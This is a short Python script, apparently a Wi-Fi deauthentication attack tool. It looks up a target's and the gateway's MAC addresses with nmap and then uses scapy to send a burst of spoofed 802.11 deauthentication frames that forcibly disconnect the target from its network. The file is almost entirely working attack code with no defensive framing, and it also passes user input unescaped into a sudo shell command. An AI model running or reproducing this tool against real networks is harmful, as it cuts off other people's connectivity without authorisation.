#need nmap to be installed as stabdalone tool
#need awk to be installed
#nedd scapy
from scapy.all import *
import subprocess
import argparse
import re
import socket, struct

def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def find_mac(ip):
    command=" sudo nmap -sP "+ip+" | awk  \'/MAC Address:/ {print $3}\' "
    target_mac = str(subprocess.check_output((command),shell=True,stderr=subprocess.STDOUT))
    target_mac=target_mac[2:]
    target_mac=target_mac[:-3]
    return target_mac

parser = argparse.ArgumentParser(description="Deauth")
parser.add_argument("target", type=str, metavar="<ipv4>target", help="The targeted ipv4 address")
parser.add_argument("iface", type=str, metavar="<iface>source", help="The wifi interface in monitor mode")
parser.add_argument("sec", type=int, metavar="<sec>", help="The deauthediaction time in seconds x 0.01")

args=parser.parse_args()

ipv4_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
if not (ipv4_pattern.search(args.target)):
    print("Wrong input!")
    print("Run: ",__file__," -h to read the usage!")
    exit()

if(__name__=="__main__"):

    target_mac = find_mac(args.target)
    gateway_mac = find_mac(get_default_gateway_linux())

   
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.01, count=int(args.sec), iface=args.iface, verbose=1)
